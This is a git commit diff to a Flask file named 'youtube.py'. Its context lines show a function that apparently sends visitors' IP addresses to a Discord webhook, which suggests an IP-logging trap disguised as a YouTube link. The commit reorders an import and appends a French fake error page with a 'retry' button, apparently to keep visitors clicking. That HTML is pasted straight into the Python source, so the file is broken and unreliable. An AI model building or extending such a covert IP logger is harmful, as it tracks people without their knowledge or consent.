20a8f11279f2ebcd5ab2f9f4658be874208d4b5f
FralkA <153741594+FralkA@users.noreply.github.com>
2023-12-31 14:34:24 +0100

    Update youtube.py

--- youtube.py
+++ youtube.py
@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, request, render_template
 import requests
 
 app = Flask(__name__)
@@ -29,3 +29,23 @@ def send_to_discord_webhook(ip_address):
 
 if __name__ == '__main__':
     app.run(debug=True)
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Erreur</title>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px;">
+        <p style="color: red;">Une erreur s'est produite</p>
+        <a href="{{ retry_url }}">
+            <button style="border: 2px solid red; padding: 10px; color: white; background-color: red; cursor: pointer;">
+                Cliquez ici pour ressayer
+            </button>
+        </a>
+    </div>
+</body>
+</html>
